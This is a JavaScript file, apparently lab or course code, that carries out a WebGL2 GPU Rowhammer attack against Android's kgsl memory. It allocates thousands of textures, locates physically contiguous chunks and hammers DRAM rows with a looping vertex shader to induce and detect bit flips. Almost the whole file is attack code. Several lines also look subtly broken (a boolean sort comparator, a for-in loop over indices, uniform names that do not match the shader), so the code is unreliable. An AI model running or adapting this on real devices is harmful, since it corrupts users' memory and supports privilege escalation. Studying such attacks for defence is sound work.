const INT_MARKER = 0x40414140
const FIRST_ELEM = 0x50515150


async function get_tex_data() {
    var result = await $.ajax({
        url: "get_tex_infos",
    })
    return JSON.parse(result)
}


async function hammer_tex(tex_id) {
    var result = await $.ajax({
        data: {"tex_id": tex_id},
        url: "hammer_tex",
    })
    // console.log(result)
    bit_flip = JSON.parse(result);
    return bit_flip;
}


// tex_id is the id of the texture where you previously found bit flips
async function hammer_array(tex_id) {
     var result = await $.ajax({
        data: {"tex_id": tex_id},
        url: "hammer_array",
    })
    
    return result;

}

// use this function if you use the simulator to initially fill the arrays before triggering the bit flips
// the first value is set to 0x50515150 to avoid getting matches for all the 0x40414140s.

function fill_arrays(arr, len) {
    for (var i = 0; i < len; i++) {
        arr[i] = INT_MARKER;
    }
    arr[0] = FIRST_ELEM;
}


// ========================== STOLEN CODE :) =======================================
// This code initialize browser and setup correct webgl2 context
var BrowserDetect = {
    init: function () {
      var info = this.searchString(this.dataBrowser) || {identity:"unknown"}
      this.browser = info.identity;
      this.version = this.searchVersion(navigator.userAgent)
          || this.searchVersion(navigator.appVersion)
          || "an unknown version";
      this.platformInfo = this.searchString(this.dataPlatform) || this.dataPlatform["unknown"];
      this.platform = this.platformInfo.identity;
      var browserInfo = this.urls[this.browser];
      if (!browserInfo) {
        browserInfo = this.urls["unknown"];
      } else if (browserInfo.platforms) {
        var info = browserInfo.platforms[this.platform];
        if (info) {
          browserInfo = info;
        }
      }
      this.urls = browserInfo;
    },
    searchString: function (data) {
      for (var i = 0; i < data.length; i++){
        var info = data[i];
        var dataString = info.string;
        var dataProp = info.prop;
        this.versionSearchString = info.versionSearch || info.identity;
        if (dataString) {
          if (dataString.indexOf(info.subString) != -1) {
            var shouldExclude = false;
            if (info.excludeSubstrings) {
              for (var ii = 0; ii < info.excludeSubstrings.length; ++ii) {
                if (dataString.indexOf(info.excludeSubstrings[ii]) != -1) {
                  shouldExclude = true;
                  break;
                }
              }
            }
            if (!shouldExclude)
              return info;
          }
        } else if (dataProp) {
          return info;
        }
      }
    },
    searchVersion: function (dataString) {
      var index = dataString.indexOf(this.versionSearchString);
      if (index == -1) {
        return;
      }
      return parseFloat(dataString.substring(
          index + this.versionSearchString.length + 1));
    },
    dataBrowser: [
    { string: navigator.userAgent,
      subString: "Chrome",
      excludeSubstrings: ["OPR/", "Edge/"],
      identity: "Chrome"
    },
    { string: navigator.userAgent,
      subString: "OmniWeb",
      versionSearch: "OmniWeb/",
      identity: "OmniWeb"
    },
    { string: navigator.vendor,
      subString: "Apple",
      identity: "Safari",
      versionSearch: "Version"
    },
    { string: navigator.vendor,
      subString: "Opera",
      identity: "Opera"
    },
    { string: navigator.userAgent,
      subString: "Android",
      identity: "Android"
    },
    { string: navigator.vendor,
      subString: "iCab",
      identity: "iCab"
    },
    { string: navigator.vendor,
      subString: "KDE",
      identity: "Konqueror"
    },
    { string: navigator.userAgent,
      subString: "Firefox",
      identity: "Firefox"
    },
    { string: navigator.vendor,
      subString: "Camino",
      identity: "Camino"
    },
    {// for newer Netscapes (6+)
      string: navigator.userAgent,
      subString: "Netscape",
      identity: "Netscape"
    },
    { string: navigator.userAgent,
      subString: "Edge/",
      identity: "Edge"
    },
    { string: navigator.userAgent,
      subString: "MSIE",
      identity: "Explorer",
      versionSearch: "MSIE"
    },
    { // for IE11+
      string: navigator.userAgent,
      subString: "Trident",
      identity: "Explorer",
      versionSearch: "rv"
    },
    { string: navigator.userAgent,
      subString: "Gecko",
      identity: "Mozilla",
      versionSearch: "rv"
    },
    { // for older Netscapes (4-)
      string: navigator.userAgent,
      subString: "Mozilla",
      identity: "Netscape",
      versionSearch: "Mozilla"
    }
    ],
    dataPlatform: [
    { string: navigator.platform,
      subString: "Win",
      identity: "Windows",
      browsers: [
        {url: "http://www.mozilla.com/en-US/firefox/new/", name: "Mozilla Firefox"},
        {url: "http://www.google.com/chrome/", name: "Google Chrome"},
      ]
    },
    { string: navigator.platform,
      subString: "Mac",
      identity: "Mac",
      browsers: [
        {url: "http://www.mozilla.com/en-US/firefox/new/", name: "Mozilla Firefox"},
        {url: "http://www.google.com/chrome/", name: "Google Chrome"},
      ]
    },
    { string: navigator.userAgent,
      subString: "iPhone",
      identity: "iPhone/iPod",
      browsers: [
        //{url: "http://www.mozilla.com/en-US/firefox/new/", name: "Mozilla Firefox"}
      ]
    },
    { string: navigator.platform,
      subString: "iPad",
      identity: "iPad",
      browsers: [
        //{url: "http://www.mozilla.com/en-US/firefox/new/", name: "Mozilla Firefox"}
      ]
    },
    { string: navigator.userAgent,
      subString: "Android",
      identity: "Android",
      browsers: [
        {url: "https://play.google.com/store/apps/details?id=org.mozilla.firefox", name: "Mozilla Firefox"},
        {url: "https://play.google.com/store/apps/details?id=com.android.chrome", name: "Google Chrome"}
      ]
    },
    { string: navigator.platform,
      subString: "Linux",
      identity: "Linux",
      browsers: [
        {url: "http://www.mozilla.com/en-US/firefox/new/", name: "Mozilla Firefox"},
        {url: "http://www.google.com/chrome/", name: "Google Chrome"},
      ]
    },
    { string: "unknown",
      subString: "unknown",
      identity: "unknown",
      browsers: [
        {url: "http://www.mozilla.com/en-US/firefox/new/", name: "Mozilla Firefox"},
        {url: "http://www.google.com/chrome/", name: "Google Chrome"},
      ]
    }
    ],
    /*
    upgradeUrl:         Tell the user how to upgrade their browser.
    troubleshootingUrl: Help the user.
    platforms:          Urls by platform. See dataPlatform.identity for valid platform names.
    */
    urls: {
      "Chrome": {
        upgradeUrl: "http://get.webgl.org/webgl2/enable.html#chrome",
        //upgradeUrl: "http://www.google.com/support/chrome/bin/answer.py?answer=95346",
        troubleshootingUrl: "http://www.google.com/support/chrome/bin/answer.py?answer=1220892"
      },
      "Firefox": {
        upgradeUrl: "http://get.webgl.org/webgl2/enable.html#firefox",
        //upgradeUrl: "http://www.mozilla.com/en-US/firefox/new/",
        troubleshootingUrl: "https://support.mozilla.com/en-US/kb/how-do-i-upgrade-my-graphics-drivers"
      },
      "Opera": {
        platforms: {
          "Android": {
            upgradeUrl: "https://market.android.com/details?id=com.opera.browser",
            troubleshootingUrl: "http://www.opera.com/support/"
          }
        },
        upgradeUrl: "http://www.opera.com/",
        troubleshootingUrl: "http://www.opera.com/support/"
      },
      "Android": {
        upgradeUrl: null,
        troubleshootingUrl: null
      },
      "Safari": {
        platforms: {
          "iPhone/iPod": {
            upgradeUrl: "http://www.apple.com/ios/",
            troubleshootingUrl: "http://www.apple.com/support/iphone/"
          },
          "iPad": {
            upgradeUrl: "http://www.apple.com/ios/",
            troubleshootingUrl: "http://www.apple.com/support/ipad/"
          },
          "Mac": {
            upgradeUrl: "http://www.webkit.org/",
            troubleshootingUrl: "https://support.apple.com/kb/PH21426"
          }
        },
        upgradeUrl: "http://www.webkit.org/",
        troubleshootingUrl: "https://support.apple.com/kb/PH21426"
      },
      "Explorer": {
        upgradeUrl: "http://www.microsoft.com/ie",
        troubleshootingUrl: "http://msdn.microsoft.com/en-us/library/ie/bg182648(v=vs.85).aspx"
      },
      "Edge": {
        upgradeUrl: "http://www.microsoft.com/en-us/windows/windows-10-upgrade",
        troubleshootingUrl: "http://msdn.microsoft.com/en-us/library/ie/bg182648(v=vs.85).aspx"
      },
      "unknown": {
        upgradeUrl: null,
        troubleshootingUrl: null
      }
    }
  };
// ========================== END OF STOLEN CODE :) ==================================


function decimalToHexString(number)
{
  if (number < 0)
  {
    number = 0xFFFFFFFF + number + 1;
  }

  return Number(number).toString(16).toUpperCase();
}

async function main() {
    // Initialization procedures
    b = BrowserDetect;
    b.init();
    var canvas = document.getElementById('triangleCanvas');
    var gl = canvas.getContext('webgl2');
    gl.viewport(0,0,canvas.width,canvas.height);

    // Shaders compilation
    var vertexShaderSource = `#version 300 es
    precision mediump float;
    uniform sampler2D row1;
    uniform sampler2D row2;
    uniform int border;
    //layout (location = 0) in vec3 threadD;
    uniform sampler2D evict1[9];
    uniform sampler2D evict2;
    uniform sampler2D evict3;
    uniform sampler2D evict4;
    uniform sampler2D evict5;
    uniform sampler2D evict6;
    uniform sampler2D evict7;
    uniform sampler2D evict8;
    uniform sampler2D evict9;
    uniform sampler2D evict10;
    uniform sampler2D evict11;
    uniform sampler2D evict12;
    vec4 val;
    void main(void){
    	//int id = int(threadD.x) % 4;
    	for(int i = 0; i < 1200000; i++){
    		
    		 val += texelFetch(row1, ivec2(0, 0), 0); 
    		 val += texelFetch(row2, ivec2(0, 0), 0) ;
    		 val += texelFetch(evict1[0], ivec2(0, 0), 0) ;
    		 val += texelFetch(evict1[6], ivec2(0, 0), 0) ;
    		 val += texelFetch(evict1[1], ivec2(0, 0), 0) ;
    		 val += texelFetch(evict1[7], ivec2(0, 0), 0) ;
    		 val += texelFetch(evict1[2], ivec2(0, 0), 0) ;
    		 val += texelFetch(evict1[8], ivec2(0, 0), 0) ;
    		 val += texelFetch(evict1[5], ivec2(0, 0), 0) ;
    		 val += texelFetch(row1, ivec2(0,0), 0) ;
    		 val += texelFetch(row2, ivec2(0, 2), 0) ;
    		 val += texelFetch(evict1[0], ivec2(0, 2), 0) ;
    		 val += texelFetch(evict1[6], ivec2(0, 2), 0) ;
    		 val += texelFetch(evict1[1], ivec2(0, 2), 0) ;
    		 val += texelFetch(evict1[7], ivec2(0, 2), 0) ;
    		 val += texelFetch(evict1[2], ivec2(0, 2), 0) ;
    		 val += texelFetch(evict1[8], ivec2(0, 2), 0) ;
    		 val += texelFetch(evict1[5], ivec2(0, 2), 0) ;
    	}
    	gl_Position = val;
    }`;


    var fragmentShaderSource = `#version 300 es
    precision mediump float;
    out vec4 FragColor;
    void main(){
    	FragColor = vec4(0., 0., 0., 1.);
    }`;
    var vertShader = gl.createShader(gl.VERTEX_SHADER);
    gl.shaderSource(vertShader, vertexShaderSource);
    gl.compileShader(vertShader);
    var compiled = gl.getShaderParameter(vertShader, gl.COMPILE_STATUS);
    if(!compiled){
        var compilationLog = gl.getShaderInfoLog(vertShader);
        console.log('Vertex Shader compiler log: ' + compilationLog);
        return;
    }
    var fragShader = gl.createShader(gl.FRAGMENT_SHADER);
    gl.shaderSource(fragShader, fragmentShaderSource);
    gl.compileShader(fragShader);
    var compiled = gl.getShaderParameter(fragShader, gl.COMPILE_STATUS);
    if(!compiled){
        var compilationLog = gl.getShaderInfoLog(fragShader);
        console.log('Fragment Shader compiler log: ' + compilationLog);
        return;
    }
    var prog = gl.createProgram();
    gl.attachShader(prog, vertShader);
    gl.attachShader(prog, fragShader);
    gl.linkProgram(prog);

    // Textures allocation
    var texs = [];
    
    var texdata = []; // data has to be not null. could be on demand allocation
    for(var i = 0; i < 32; ++i) for(var j  = 0; j < 32; ++j) for(var bt = 0; bt < 4; ++bt) texdata.push(0xff)
    texdata = new Uint8Array(texdata);

    var zerotexdata = []; // data has to be not null. could be on demand allocation
    for(var i = 0; i < 32; ++i) for(var j  = 0; j < 32; ++j) for(var bt = 0; bt < 4; ++bt) zerotexdata.push(0x0)
    zerotexdata = new Uint8Array(zerotexdata);
    get_tex_data().then(function(data){
        var old_kgsl = data;
        for (var i = 0; i < 20000; ++i){
            texs.push(gl.createTexture())
            gl.bindTexture(gl.TEXTURE_2D, texs[i]);
            var level = 0;
            var internalFormat = gl.RGBA;
            var border = 0;
            var format = gl.RGBA;
            var type = gl.UNSIGNED_BYTE;
           
            gl.texImage2D(gl.TEXTURE_2D, level, internalFormat,
                            32, 32, border,
                            format, type, texdata);
     
            gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_S, gl.CLAMP_TO_EDGE);
            gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_T, gl.CLAMP_TO_EDGE);
            gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.NEAREST);
            gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.NEAREST);
            // gl.texSubImage2D(gl.TEXTURE_2D, 0, 0, 0, 1, 0, format, type, new Uint8Array([0xffffffff,0xffffffff,0xffffffff]));
        }
    
        // Since all textures are really allocated in DRAM, now it's time to identify contigious chunks of memory
    
        var FBF = gl.createFramebuffer();
        var kgsl = {}
        get_tex_data().then(function(data){
            /* Example of kgsl entry
            * {
            * pfn: 28576
            * tex_id: 112
            * tex_size: 1114112
            * v_addr: 2237923328
            * }
            */
            kgsl = data; 
            kgsl = kgsl.sort(function(a, b){return a.pfn > b.pfn}); // asc order by pfns
            var startID = 0xffffffffffff;

            for(var ent in kgsl){if(startID > ent.tex_id) startID = ent.tex_id;}
            var kgslmap = []
            var counter = 1;
            for(var i = 1; i < kgsl.length; ++i){
                // console.log("DIFF : " + (kgsl[i].pfn - kgsl[i - 1].pfn));
                if(kgsl[i].pfn - kgsl[i - 1].pfn == 1){
                    ++counter;
                    if(counter == 64){
                        counter = 1;
                        kgslmap.push(i - 64);
                    }
                } else {
                    counter = 1;
                } 
            }
            console.log("Detected <" + kgslmap.length + "> contigious chunks...");
            console.log("HAMMERING MATHAFAKA...");
            for(var i = 0; i < kgslmap.length; ++i){
                for(var k = 0; k < 28; ++k){
                    gl.useProgram(prog);
                    console.log("Hammering [" + i +" : " + k + "]");
                    // HAMMERED ROW
                    for(var j = 0 ; j < 4; ++j){
                        gl.bindTexture(gl.TEXTURE_2D, texs[kgsl[kgslmap[i] + k + 16 + j].tex_id - startID]);
                        gl.texSubImage2D(gl.TEXTURE_2D, 0, 0, 0, 32, 32, gl.RGBA, gl.UNSIGNED_BYTE, texdata);
                    }
    
                    // IDLE ROWS
                    var evictionTexLocation = gl.getUniformLocation(prog, "row1");
                    gl.uniform1i(evictionTexLocation, 0);
                    gl.activeTexture(gl.TEXTURE0); // eviction Texture Unit
                    gl.bindTexture(gl.TEXTURE_2D, texs[kgsl[kgslmap[i] + k].tex_id - startID]);
                    gl.texSubImage2D(gl.TEXTURE_2D, 0, 0, 0, 32, 32, gl.RGBA, gl.UNSIGNED_BYTE, zerotexdata);
                    
                    var evictionTexLocation2 = gl.getUniformLocation(prog, "row2");
                    gl.uniform1i(evictionTexLocation, 1);
                    gl.activeTexture(gl.TEXTURE0 + 1); // eviction Texture Unit
                    gl.bindTexture(gl.TEXTURE_2D, texs[kgsl[kgslmap[i] + k + 32].tex_id - startID]);
                    gl.texSubImage2D(gl.TEXTURE_2D, 0, 0, 0, 32, 32, gl.RGBA, gl.UNSIGNED_BYTE, zerotexdata);
                    
                    for(var j = 0 ; j < 4; ++j){
                        var evictLoc = gl.getUniformLocation(prog, "evict[" + j + "]");
                        gl.uniform1i(evictionTexLocation, 0);
                        gl.activeTexture(gl.TEXTURE0 + 2 + j); // eviction Texture Unit
                        gl.bindTexture(gl.TEXTURE_2D, texs[kgsl[kgslmap[i] + k + 1 + j].tex_id - startID]);
                        gl.texSubImage2D(gl.TEXTURE_2D, 0, 0, 0, 32, 32, gl.RGBA, gl.UNSIGNED_BYTE, zerotexdata);
                    }
    
                    for(var j = 0 ; j < 4; ++j){
                        var evictLoc = gl.getUniformLocation(prog, "evict[" + 4 + j + "]");
                        gl.uniform1i(evictionTexLocation, 0);
                        gl.activeTexture(gl.TEXTURE0 + 6 + j); // eviction Texture Unit
                        gl.bindTexture(gl.TEXTURE_2D, texs[kgsl[kgslmap[i] + k + 33 + j].tex_id - startID]);
                        gl.texSubImage2D(gl.TEXTURE_2D, 0, 0, 0, 32, 32, gl.RGBA, gl.UNSIGNED_BYTE, zerotexdata);
                    }
    
                    var evictLoc = gl.getUniformLocation(prog, "evict[8]");
                    gl.uniform1i(evictionTexLocation, 0);
                    gl.activeTexture(gl.TEXTURE0 + 10); // eviction Texture Unit
                    gl.bindTexture(gl.TEXTURE_2D, texs[kgsl[kgslmap[i] + k + 5].tex_id - startID]);
                    gl.texSubImage2D(gl.TEXTURE_2D, 0, 0, 0, 32, 32, gl.RGBA, gl.UNSIGNED_BYTE, zerotexdata);
            
                    gl.clearColor(1, 0, 1, 1);
                    gl.clear(gl.COLOR_BUFFER_BIT);
                    console.log("RUNNING ...")
                    gl.drawArrays(gl.TRIANGLES, 0, 3);
                    console.log("EXECUTED ..")
                    gl.bindFramebuffer(gl.FRAMEBUFFER, FBF);
                    for(var j = 0 ; j < 4; ++j){
                        // kgsl[kgslmap[i] + k + 16 + j].tex_id
                        gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, texs[kgsl[kgslmap[i] + k + 16 + j].tex_id - startID], 0);
                        frame = new Uint8Array(32*32*4);
                        gl.readPixels(0, 0, 32, 32, gl.RGBA, gl.UNSIGNED_BYTE, frame);
                        for(var it = 0; it < 32 * 32 * 4; ++it)
                            if(frame[it] != 0xff){
                                
                                console.log("BITFLIP FROM 0xff to 0x" + (frame[it]))
                            }
                    }
                    gl.bindFramebuffer(gl.FRAMEBUFFER, 0);
                }
            }
        
          
            
        })
    
    })
	    
}

